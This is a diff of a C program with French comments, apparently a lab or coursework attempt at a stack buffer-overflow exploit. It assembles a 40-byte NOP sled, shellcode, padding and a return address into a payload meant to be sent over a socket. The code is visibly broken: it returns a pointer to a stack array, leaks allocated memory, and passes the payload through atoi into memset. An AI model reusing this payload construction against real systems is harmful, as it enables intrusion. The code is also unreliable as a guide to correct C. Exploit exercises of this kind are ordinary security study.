@@ -8,14 +8,16 @@
 
 // Voir fonction strcat pour concaténer des chars (string.h)
 
-char crafted_payload(){
+size_t pay_size;
+
+char* crafted_payload(){
 
 	// Serie de NOP
 	int nb_nop = 40;
 	char nops[nb_nop];
 	char un_nop[] = "\x90";
 	for (int i = 0; i < nb_nop; i++){
-		nops[i] = un_nop;
+		nops[i] = *un_nop;
 	}
 	printf("%s\n", nops);
 
@@ -34,9 +36,15 @@ char crafted_payload(){
 	strcat(nops, shellcode);
 	strcat(padding_bp, retour);
 	strcat(nops, padding_bp);
-	//printf("%s\n", nops);
+	printf("%s\n", nops);
 
-	return *nops;
+	pay_size = sizeof(nops);
+	printf("%zu\n", pay_size);
+
+	char * pay = malloc(pay_size * sizeof(char));
+	pay = nops;
+
+	return pay;
 }
 
 int func(int sockfd, char *pay)
@@ -63,10 +71,8 @@ int main (int argc, char *argv[]){
 
 	int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 
 
-
-	char payload[] = crafted_payload();
-	char (*my_func)() = crafted_payload;
-	//char payload = (*my_func)();
+	char payload[pay_size];
+	memset(payload, atoi(crafted_payload()), pay_size);
 	
     // Ecriture en dur du shellcode : 
     // NOP *40(etc 1 octet chaque)
